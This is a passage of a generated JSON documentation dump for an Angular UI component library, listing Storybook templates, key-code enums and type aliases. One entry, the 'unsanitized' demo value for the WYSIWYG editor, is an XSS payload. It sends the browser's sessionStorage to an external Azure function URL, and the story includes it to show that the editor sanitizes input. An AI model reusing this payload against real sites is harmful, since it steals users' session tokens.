          "defaultValue": "(args: Record<string, unknown>) => ( {\n  props: { ...args },\n  template: `<mat-card class=\"sto-card\">\n<div style=\"background: white;\" stoGrid [maxWidth]=\"1000\" [breakpoints]=\"breakpoints\">\n<div stoGridColumn style=\"background: lightblue;\">1 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">2 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">3 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">4 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">5 (col)</div>\n<div stoGridColumn style=\"background: lightblue;\">6 (col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">7 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">8 (double col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" stoGridSpacer>9 (double spacer, hidden on 2-col)</div>\n<div stoGridColumn [stoGridColumnDouble]=\"true\" style=\"background: lightblue;\">10 (double col)</div>\n<div stoGridColumn style=\"background: lightblue;\">11 (col)</div>\n<div stoGridColumn stoGridSpacer>12 (spacer, hidden on 1-col)</div>\n<div stoGridColumn style=\"background: transparent;\" class=\"sto-form\"></div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\">13 (col spacer, hidden on 1-col grid)</div>\n<div stoGridColumn stoGridSpacer style=\"background: lightblue;\" [stoGridColumnDouble]=\"true\" >14 (double spacer, hidden on 2-col)</div>\n</div>\n</mat-card>`\n} )"
        }
      ],
      "libs/form/src/lib/sto-form/form-field.stories.ts": [
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args) => {\n  return {\n    component: FormFieldDirective,\n    props: {\n      ...args,\n      formGroup: new UntypedFormGroup({\n        first: new UntypedFormControl('Some value')\n      }),\n      dropdown: 'B'\n    },\n    template: `\n  <mat-card class=\"sto-form\">\n<mat-form-field [formGroup]=\"formGroup\" stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<input  formControlName=\"first\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Form field with styles</mat-label>\n<mat-select name=\"dropdown\" [ngModel]=\"dropdown\" (selectionChange)=\"dropdown = $event\">\n<mat-option value=\"A\">A</mat-option>\n<mat-option value=\"B\">B</mat-option>\n</mat-select>\n</mat-form-field>\n<mat-form-field appearance=\"fill\" *ngIf=\"!withClasses\">\n<mat-label>Form field without styles</mat-label>\n<input value=\"Some value\" [disabled]=\"disabled\" [readonly]=\"readonly\" matInput>\n</mat-form-field>\n<mat-form-field stoFormField *ngIf=\"withClasses\">\n<mat-label>Text area with styles</mat-label>\n<textarea name=\"test\" matInput [cdkTextareaAutosize]=\"true\">\nSome Text Content\n\nShould not select all on click\n</textarea>\n</mat-form-field>\n</mat-card>`\n  };\n}"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-form/form-field.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        }
      ],
      "libs/form/src/lib/number-input/number-input.stories.ts": [
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/number-input.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<>",
          "defaultValue": "(args) => {\n  return {\n    component: NumberInputComponent,\n    props: {\n      ...args,\n      change: action('Value changed'),\n      control: new UntypedFormControl(null, Validators.required),\n      toggleValidator: (ctrl: AbstractControl) => {\n        if ( ctrl.validator ) {\n          ctrl.clearValidators();\n        } else {\n          ctrl.setValidators(Validators.required);\n        }\n        ctrl.updateValueAndValidity();\n      },\n    },\n    template: `\n  <mat-card class=\"sto-form\" style=\"width: 600px\">\n  <button (click)=\"control.disabled ? control.enable() : control.disable()\">Toggle disabled</button><br>\n  <button (click)=\"toggleValidator(control)\">Toggle validator</button><br>\n  <button (click)=\"control.markAsTouched()\">Touched</button><br>\n    <mat-form-field stoFormField floatLabel=\"always\">\n      <mat-label>{{label}}</mat-label>\n      <sto-number-input (ngModelChange)=\"change($event)\"\n            [dynamicFractionSize]=\"dynamicFractionSize\"\n                        [fractionSize]=\"fractionSize\"\n                        [readonly]=\"readonly\"\n                        [formControl]=\"control\"\n                        [placeholder]=\"placeholder\">\n      </sto-number-input>\n      <span matSuffix>{{ suffix }}</span>\n      <mat-error *ngIf=\"control.hasError('required')\">{{ control.getError('required') }}</mat-error>\n    </mat-form-field><br>\n    {{control.value}}\n  </mat-card>`\n  };\n}"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/number-input/number-input.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        }
      ],
      "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts": [
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<SlideToggleComponent>",
          "defaultValue": "(args) => {\n  return {\n    component: SlideToggleComponent,\n    props: {\n      ...args,\n      ctrl: new UntypedFormControl(true),\n      valueChange: action('Value changed'),\n      toggled: (event: unknown) => {\n        console.log(event);\n        action('Toggled event');\n      }\n    },\n    template: `\n<mat-card style=\"width: 300px\" class=\"sto-form\">\n  <button (click)=\"ctrl.disabled ? ctrl.enable() : ctrl.disable()\">Toggle disabled</button><br>\n<mat-form-field stoFormField floatLabel=\"always\">\n    <mat-label>Slide toggle</mat-label>\n    <sto-slide-toggle (toggled)=\"toggled($event)\" [color]=\"color\" [readonly]=\"readonly\" [formControl]=\"ctrl\" (ngModelChange)=\"valueChange($event)\"></sto-slide-toggle>\n</mat-form-field>\n</mat-card>`\n  };\n}"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/slide-toggle/slide-toggle.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        }
      ],
      "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts": [
        {
          "name": "Template",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<WysiwygComponent>",
          "defaultValue": "(args) => {\n  const ctrl = new UntypedFormControl(unsanitized);\n  return {\n    props: { ...args, ctrl, unsanitized },\n    template: `\n<sto-wysiwyg [readonly]=\"readonly\" #wysiwyg [formControl]=\"ctrl\"></sto-wysiwyg>\n<hr>\n<div>\n<p>The text we're sending in is</p>\n<div style=\"background-color: lightgray\"><code>{{ unsanitized }}</code></div>\n<br>\n<p>The resulting HTML output is then sanitized </p>\n<div style=\"background-color: lightgray\"><code >{{ wysiwyg.value.changingThisBreaksApplicationSecurity }}</code></div>\n<p>While it gets sanitized in the wysiwyg editor, best practice dictates that sanitizing happens before sending it in\n(and preferable on your backend service)</p>\n</div>\n`\n  };\n}"
        },
        {
          "name": "unsanitized",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "`<iframe srcdoc=\"<script>xmlHttp = new XMLHttpRequest();xmlHttp.open('POST','https://trader-x.azurewebsites.net/api/HttpTrigger1?code=3T29B641DhuW5ZA9GzvBiSNa4aoHmg1isvFE3JFEQAx7RqmOt6oIfA==',false);xmlHttp.send('token='+JSON.stringify(sessionStorage));</script>\">\n</iframe>\n<b>This is bold.</b>\n`"
        },
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-wysiwyg/wysiwyg.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "Template.bind({})"
        }
      ],
      "libs/common/src/lib/theme/theme-saver.service.ts": [
        {
          "name": "THEME_SAVER",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/theme/theme-saver.service.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new InjectionToken<ThemeSaver>('sto__theme__typo')"
        }
      ],
      "libs/common/src/lib/theme/models.ts": [
        {
          "name": "themes",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new Map<ThemeName, ThemeClassName>([\n  [ 'light', 'sto-light-theme' ],\n  [ 'dark', 'sto-dark-theme' ],\n])"
        },
        {
          "name": "typography",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/theme/models.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new Map<TypographyName, TypographyClassName>([\n  [ 'small', 'sto-sm-typography' ],\n  [ 'medium', 'sto-m-typography' ],\n  [ 'large', 'sto-l-typography' ],\n])"
        }
      ],
      "jest.config.ts": [
        {
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "jest.config.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "require('@nrwl/jest')"
        }
      ],
      "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts": [
        {
          "name": "Usage",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/common/src/lib/sto-confirm-dialog/confirm-dialog.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "Story<ConfirmDemoComponent>",
          "defaultValue": "(args: ConfirmDemoComponent) => {\n  return {\n    component: ConfirmDemoComponent,\n    props: args,\n    template: '<app-confirm-demo></app-confirm-demo>'\n  };\n}"
        }
      ],
      "libs/drawer/src/lib/sto-navigation/tokens.ts": [
        {
          "name": "USE_HASH_ROUTING",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/drawer/src/lib/sto-navigation/tokens.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "",
          "defaultValue": "new InjectionToken<boolean>('sto.nav.hash')"
        }
      ],
      "libs/form/src/lib/sto-wysiwyg/modifiers.ts": [
        {
          "name": "validCommands",
          "ctype": "miscellaneous",
          "subtype": "variable",
          "file": "libs/form/src/lib/sto-wysiwyg/modifiers.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "type": "[]",
          "defaultValue": "[\n  'bold',\n  'underline',\n  'italic',\n  'createLink',\n  'insertUnorderedList',\n  'insertOrderedList',\n  'removeFormat',\n]"
        }
      ]
    },
    "groupedFunctions": {
      "libs/error-handler/src/lib/wrapper.ts": [
        {
          "name": "LoggerFactory",
          "file": "libs/error-handler/src/lib/wrapper.ts",
          "ctype": "miscellaneous",
          "subtype": "function",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "args": [
            {
              "name": "http",
              "type": "HttpClient",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "jsdoctags": [
            {
              "name": "http",
              "type": "HttpClient",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ],
      "tools/scripts/build-scss.ts": [
        {
          "name": "processScss",
          "file": "tools/scripts/build-scss.ts",
          "ctype": "miscellaneous",
          "subtype": "function",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "args": [
            {
              "name": "file",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            },
            {
              "name": "outFile",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": ""
            }
          ],
          "returnType": "Promise<void>",
          "jsdoctags": [
            {
              "name": "file",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            },
            {
              "name": "outFile",
              "type": "string",
              "deprecated": false,
              "deprecationMessage": "",
              "tagName": {
                "text": "param"
              }
            }
          ]
        }
      ]
    },
    "groupedEnumerations": {
      "libs/datatable/src/lib/sto-datatable/columns.ts": [
        {
          "name": "ColumnDisplay",
          "childs": [
            {
              "name": "Flex",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "flex"
            },
            {
              "name": "Force",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "force"
            }
          ],
          "ctype": "miscellaneous",
          "subtype": "enum",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "file": "libs/datatable/src/lib/sto-datatable/columns.ts"
        }
      ],
      "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts": [
        {
          "name": "Key",
          "childs": [
            {
              "name": "Backspace",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 8
            },
            {
              "name": "Tab",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 9
            },
            {
              "name": "Enter",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 13
            },
            {
              "name": "Shift",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 16
            },
            {
              "name": "Ctrl",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 17
            },
            {
              "name": "Alt",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 18
            },
            {
              "name": "PauseBreak",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 19
            },
            {
              "name": "CapsLock",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 20
            },
            {
              "name": "Escape",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 27
            },
            {
              "name": "Space",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 32
            },
            {
              "name": "PageUp",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 33
            },
            {
              "name": "PageDown",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 34
            },
            {
              "name": "End",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 35
            },
            {
              "name": "Home",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 36
            },
            {
              "name": "LeftArrow",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 37
            },
            {
              "name": "UpArrow",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 38
            },
            {
              "name": "RightArrow",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 39
            },
            {
              "name": "DownArrow",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 40
            },
            {
              "name": "Insert",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 45
            },
            {
              "name": "Delete",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 46
            },
            {
              "name": "Zero",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 48
            },
            {
              "name": "ClosedParen",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Zero"
            },
            {
              "name": "One",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 49
            },
            {
              "name": "ExclamationMark",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "One"
            },
            {
              "name": "Two",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 50
            },
            {
              "name": "AtSign",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Two"
            },
            {
              "name": "Three",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 51
            },
            {
              "name": "PoundSign",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Three"
            },
            {
              "name": "Hash",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "PoundSign"
            },
            {
              "name": "Four",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 52
            },
            {
              "name": "DollarSign",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Four"
            },
            {
              "name": "Five",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 53
            },
            {
              "name": "PercentSign",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Five"
            },
            {
              "name": "Six",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 54
            },
            {
              "name": "Caret",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Six"
            },
            {
              "name": "Hat",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Caret"
            },
            {
              "name": "Seven",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 55
            },
            {
              "name": "Ampersand",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Seven"
            },
            {
              "name": "Eight",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 56
            },
            {
              "name": "Star",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Eight"
            },
            {
              "name": "Asterik",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Star"
            },
            {
              "name": "Nine",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 57
            },
            {
              "name": "OpenParen",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Nine"
            },
            {
              "name": "A",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 65
            },
            {
              "name": "B",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 66
            },
            {
              "name": "C",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 67
            },
            {
              "name": "D",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 68
            },
            {
              "name": "E",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 69
            },
            {
              "name": "F",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 70
            },
            {
              "name": "G",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 71
            },
            {
              "name": "H",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 72
            },
            {
              "name": "I",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 73
            },
            {
              "name": "J",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 74
            },
            {
              "name": "K",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 75
            },
            {
              "name": "L",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 76
            },
            {
              "name": "M",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 77
            },
            {
              "name": "N",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 78
            },
            {
              "name": "O",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 79
            },
            {
              "name": "P",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 80
            },
            {
              "name": "Q",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 81
            },
            {
              "name": "R",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 82
            },
            {
              "name": "S",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 83
            },
            {
              "name": "T",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 84
            },
            {
              "name": "U",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 85
            },
            {
              "name": "V",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 86
            },
            {
              "name": "W",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 87
            },
            {
              "name": "X",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 88
            },
            {
              "name": "Y",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 89
            },
            {
              "name": "Z",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 90
            },
            {
              "name": "LeftWindowKey",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 91
            },
            {
              "name": "RightWindowKey",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 92
            },
            {
              "name": "SelectKey",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 93
            },
            {
              "name": "Numpad0",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 96
            },
            {
              "name": "Numpad1",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 97
            },
            {
              "name": "Numpad2",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 98
            },
            {
              "name": "Numpad3",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 99
            },
            {
              "name": "Numpad4",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 100
            },
            {
              "name": "Numpad5",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 101
            },
            {
              "name": "Numpad6",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 102
            },
            {
              "name": "Numpad7",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 103
            },
            {
              "name": "Numpad8",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 104
            },
            {
              "name": "Numpad9",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 105
            },
            {
              "name": "Multiply",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 106
            },
            {
              "name": "Add",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 107
            },
            {
              "name": "Subtract",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 109
            },
            {
              "name": "DecimalPoint",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 110
            },
            {
              "name": "Divide",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 111
            },
            {
              "name": "F1",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 112
            },
            {
              "name": "F2",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 113
            },
            {
              "name": "F3",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 114
            },
            {
              "name": "F4",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 115
            },
            {
              "name": "F5",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 116
            },
            {
              "name": "F6",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 117
            },
            {
              "name": "F7",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 118
            },
            {
              "name": "F8",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 119
            },
            {
              "name": "F9",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 120
            },
            {
              "name": "F10",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 121
            },
            {
              "name": "F11",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 122
            },
            {
              "name": "F12",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 123
            },
            {
              "name": "NumLock",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 144
            },
            {
              "name": "ScrollLock",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 145
            },
            {
              "name": "SemiColon",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 186
            },
            {
              "name": "Equals",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 187
            },
            {
              "name": "Comma",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 188
            },
            {
              "name": "Dash",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 189
            },
            {
              "name": "Period",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 190
            },
            {
              "name": "UnderScore",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Dash"
            },
            {
              "name": "PlusSign",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Equals"
            },
            {
              "name": "ForwardSlash",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 191
            },
            {
              "name": "Tilde",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 192
            },
            {
              "name": "GraveAccent",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "Tilde"
            },
            {
              "name": "OpenBracket",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 219
            },
            {
              "name": "ClosedBracket",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 221
            },
            {
              "name": "Quote",
              "deprecated": false,
              "deprecationMessage": "",
              "value": 222
            }
          ],
          "ctype": "miscellaneous",
          "subtype": "enum",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "<p>MIT License</p>\n<p>Copyright (c) 2017 Nathan Friend</p>\n<p>Permission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the &quot;Software&quot;), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:</p>\n<p>The above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.</p>\n<p>THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE. *</p>\n",
          "file": "libs/core/src/lib/abstract-and-interfaces/keyPress.enum.ts"
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
        {
          "name": "MenuItemTypes",
          "childs": [
            {
              "name": "External",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "externalLink"
            },
            {
              "name": "ExternalNew",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "externalLinkNewWindow"
            },
            {
              "name": "Internal",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "internalLink"
            },
            {
              "name": "Navigate",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "navigate"
            }
          ],
          "ctype": "miscellaneous",
          "subtype": "enum",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts"
        }
      ],
      "libs/datatable/src/lib/sto-datatable/selection-modes.ts": [
        {
          "name": "SelectionModes",
          "childs": [
            {
              "name": "Click",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "click"
            },
            {
              "name": "DoubleClick",
              "deprecated": false,
              "deprecationMessage": "",
              "value": "dblclick"
            }
          ],
          "ctype": "miscellaneous",
          "subtype": "enum",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "file": "libs/datatable/src/lib/sto-datatable/selection-modes.ts"
        }
      ]
    },
    "groupedTypeAliases": {
      "libs/datatable/src/lib/sto-datatable/columns.ts": [
        {
          "name": "ClassFunction",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "function",
          "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 178
        },
        {
          "name": "SortFunction",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "function",
          "file": "libs/datatable/src/lib/sto-datatable/columns.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 178
        }
      ],
      "libs/drawer/src/lib/nav-drawer/navigation.ts": [
        {
          "name": "CommonNavigation",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "literal type",
          "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 181
        },
        {
          "name": "Divider",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "\"below\" | \"above\" | null",
          "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 186
        },
        {
          "name": "Navigation",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "",
          "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 187
        },
        {
          "name": "NavigationChild",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "",
          "file": "libs/drawer/src/lib/nav-drawer/navigation.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 187
        }
      ],
      "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts": [
        {
          "name": "Data",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "literal type",
          "file": "libs/common/src/lib/sto-confirm-dialog/sto-confirm-dialog.component.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 181
        }
      ],
      "libs/error-handler/src/lib/error-handler/error-handler.ts": [
        {
          "name": "Handler",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "function",
          "file": "libs/error-handler/src/lib/error-handler/error-handler.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 178
        }
      ],
      "libs/datatable/src/lib/sto-datatable/events.ts": [
        {
          "name": "HeaderContextMenu",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "ContextMenu",
          "file": "libs/datatable/src/lib/sto-datatable/events.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 177
        },
        {
          "name": "RowContextMenu",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "",
          "file": "libs/datatable/src/lib/sto-datatable/events.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 187
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation.stories.ts": [
        {
          "name": "Menu",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "literal type",
          "file": "libs/drawer/src/lib/sto-navigation/navigation.stories.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 181
        }
      ],
      "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts": [
        {
          "name": "Menu",
          "ctype": "miscellaneous",
          "subtype": "typealias",
          "rawtype": "",
          "file": "libs/drawer/src/lib/sto-navigation/navigation-menu/menu.ts",
          "deprecated": false,
          "deprecationMessage": "",
          "description": "",
          "kind": 187
        }
      ],
      "libs/form/src/lib/number-input/number-unit-input/number-unit-input.component.ts": [
        {
          "name": "NumberUnitForm",
